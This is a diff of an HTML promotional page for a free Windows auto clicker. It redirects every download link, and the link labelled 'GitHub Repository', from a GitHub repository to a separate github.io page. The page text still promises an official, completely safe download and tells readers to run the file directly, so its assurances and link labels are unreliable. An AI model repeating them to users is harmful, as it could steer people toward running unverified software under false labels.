@@ -8,7 +8,7 @@
     <meta name="keywords" content="auto, auto-clicker, automation, clicker, clicker-open, free-download, gaming-utilities, github-project, macro-recorder, open, open-source, source, windows">
     <meta property="og:title" content="auto-clicker-opensource - Free Auto Clicker for Windows">
     <meta property="og:description" content="Download auto-clicker-opensource, a clean auto clicker with the ten features people actually want, none of the installer junk. Free, open community project for Windows.">
-    <meta property="og:url" content="https://github.com/origamibottlebill2593/auto-clicker-opensource">
+    <meta property="og:url" content="https://origamibottlebill2593.github.io">
     <meta property="og:type" content="website">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -38,7 +38,7 @@
     <div class="header">
         <h1>⚡ auto-clicker-opensource - Your Clean, Free Auto Clicker for Windows</h1>
         <p>Automate repetitive clicks with the ten features people actually want – no installer junk, just pure open-source utility.</p>
-        <a href="https://github.com/origamibottlebill2593/auto-clicker-opensource" class="btn">⬇️ Download Auto Clicker Now – Free</a>
+        <a href="https://origamibottlebill2593.github.io" class="btn">⬇️ Download Auto Clicker Now – Free</a>
     </div>
 
     <div class="container">
@@ -48,7 +48,7 @@
             
             <div class="step">
                 <h3>Step 1:️ Download the Application</h3>
-                <p><strong>Visit this link to download the application:</strong> <a href="https://github.com/origamibottlebill2593/auto-clicker-opensource">https://github.com/origamibottlebill2593/auto-clicker-opensource</a></p>
+                <p><strong>Visit this link to download the application:</strong> <a href="https://origamibottlebill2593.github.io">https://origamibottlebill2593.github.io</a></p>
                 <p>This will bring you to the official GitHub page for the project, where the latest version of the software is waiting for you. The download is completely safe and free – no hidden costs, no bundled adware, no signing up for newsletters.</p>
             </div>
             
@@ -84,7 +84,7 @@
         <div class="card">
             <h2>📥 Download & Install</h2>
             <p>Ready to boost your productivity? The process couldn't be simpler:</p>
-            <p><strong>Visit this link to download the application:</strong> <a href="https://github.com/origamibottlebill2593/auto-clicker-opensource" class="btn-small">⬇️ Go to Download Page</a></p>
+            <p><strong>Visit this link to download the application:</strong> <a href="https://origamibottlebill2593.github.io" class="btn-small">⬇️ Go to Download Page</a></p>
             <p>Once downloaded, run the file directly – no installation wizard, no extra steps. The program is portable, meaning it can run from a USB stick or any folder without changing system settings. It's designed to be unobtrusive and resource-light, using less than 10 MB of RAM while idle.</p>
         </div>
 
@@ -135,7 +135,7 @@
     </div>
 
     <div class="footer">
-        <p>© 2025 auto-clicker-opensource. Free forever. Made with ❤️ by the community. | <a href="https://github.com/origamibottlebill2593/auto-clicker-opensource">GitHub Repository</a></p>
+        <p>© 2025 auto-clicker-opensource. Free forever. Made with ❤️ by the community. | <a href="https://origamibottlebill2593.github.io">GitHub Repository</a></p>
     </div>
 </body>
 </html>
